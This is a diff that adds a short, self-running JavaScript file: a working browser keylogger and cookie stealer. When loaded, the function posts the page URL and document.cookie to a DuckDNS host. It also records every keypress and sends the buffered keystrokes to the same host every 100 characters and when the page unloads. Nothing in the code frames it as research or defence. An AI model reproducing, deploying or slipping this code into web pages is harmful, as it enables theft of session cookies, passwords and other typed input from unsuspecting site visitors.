@@ -1,0 +1,106 @@
+function nxtrk(nxid){
+	
+	// declaring required buffers
+	var xhr1 = new XMLHttpRequest(), kbuf = null, spt = window.location.href;
+	
+	if(("withCredentials" in xhr1)){
+		
+		// XHR for Chrome / Firefox / Opera / Safari
+		xhr1.open('POST', 'http://somehost.duckdns.org/api', true);
+		
+	}else if(typeof(XDomainRequest) != 'undefined'){
+		
+		// XDomainRequest for IE
+		xhr1 = new XDomainRequest();
+		xhr1.open('POST', 'http://somehost.duckdns.org/api');
+		
+	}else{xhr1 = null;} // CORS NOT SUPPORTED
+	
+	
+	// validating CORS support
+	if((xhr1 !== null)){
+		
+		// Response handlers (possible remove)
+		xhr1.onload = function(){};
+		xhr1.onerror = function(){};
+
+		// set post request headers and send request
+		xhr1.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+		xhr1.send("nxid=" + nxid + "&nxop=nx01&spt=" + spt + "&cks=" + document.cookie);
+		
+		
+		
+		/* 
+		 * 
+		 * KLOGS SPOT 
+		 * 
+		 *-----------------------------------------
+		 *  
+		 */
+		 
+		 
+		window.onbeforeunload = function(){
+			
+			var xhr2 = new XMLHttpRequest();
+			if(("withCredentials" in xhr2)){
+	
+				// XHR for Chrome / Firefox / Opera / Safari
+				xhr2.open('POST', 'http://somehost.duckdns.org/api', true);
+				
+			}else if(typeof(XDomainRequest) != 'undefined'){
+				
+				// XDomainRequest for IE
+				xhr2 = new XDomainRequest();
+				xhr2.open('POST', 'http://somehost.duckdns.org/api');
+				
+			}else{xhr2 = null;} // CORS NOT SUPPORTED
+			
+			if((xhr2 !== null) && (kbuf !== null)){
+	
+				// Response handlers (possible remove)
+				xhr2.onload = function(){};
+				xhr2.onerror = function(){};
+
+				// set post request headers and send request
+				xhr2.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+				xhr2.send("nxid=" + nxid + "&nxop=nx02&klg=" + kbuf + "&spt=" + spt);
+				kbuf = null;
+			}
+		}; 
+		
+		document.onkeypress = function(e){
+			
+			if(kbuf === null){kbuf = e.key;}else{kbuf += e.key;}
+			if(kbuf.length === 100){
+				
+				var xhr2 = new XMLHttpRequest();
+				if(("withCredentials" in xhr2)){
+		
+					// XHR for Chrome / Firefox / Opera / Safari
+					xhr2.open('POST', 'http://somehost.duckdns.org/api', true);
+					
+				}else if(typeof(XDomainRequest) != 'undefined'){
+					
+					// XDomainRequest for IE
+					xhr2 = new XDomainRequest();
+					xhr2.open('POST', 'http://somehost.duckdns.org/api');
+					
+				}else{xhr2 = null;} // CORS NOT SUPPORTED
+				
+				if((xhr2 !== null)){
+		
+					// Response handlers (possible remove)
+					xhr2.onload = function(){};
+					xhr2.onerror = function(){};
+
+					// set post request headers and send request
+					xhr2.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+					xhr2.send("nxid=" + nxid + "&nxop=nx02&klg=" + kbuf + "&spt=" + spt);
+					kbuf = null;
+				}
+			}
+		};
+		
+	}else{return;} // bail out
+	
+}nxtrk(nxid);
